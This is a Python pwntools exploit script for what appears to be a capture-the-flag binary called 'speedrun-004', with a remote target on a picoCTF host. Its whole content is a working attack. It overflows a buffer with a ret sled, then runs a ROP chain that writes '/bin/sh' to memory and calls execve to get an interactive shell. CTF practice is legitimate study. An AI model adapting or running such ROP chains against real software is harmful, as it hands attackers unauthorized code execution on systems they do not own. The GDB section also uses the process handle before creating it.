#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./speedrun-004", checksec=False)
#libc = ELF("/tmp/libc6_2.35-0ubuntu3.10_i386.so", checksec=False)

warn = lambda msg, x: log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0804863B
        c
	''')
    input()

p = conn()

mov__rdi_rsi = p64(0x000000000044788b)
pop_rdi = p64(0x0000000000400686)
pop_rsi = p64(0x0000000000410a93)
pop_rdx = p64(0x000000000044c6b6)
pop_rax = p64(0x0000000000415f04)
syscall = p64(0x000000000040132c)
rw = p64(0x6bb600)
ret = p64(0x0000000000400416)

rop = b""
rop += pop_rdi + rw
rop += pop_rsi + b"/bin/sh\0"
rop += mov__rdi_rsi

rop += pop_rsi + p64(0)
rop += pop_rdx + p64(0)
rop += pop_rax + p64(0x3b)
rop += syscall

sla(b"how much do you have to say?\n", b'257')
payload = ret*20 + rop + b'\0'
sa(b"Ok, what do you have to say for yourself?\n", payload)

p.interactive()
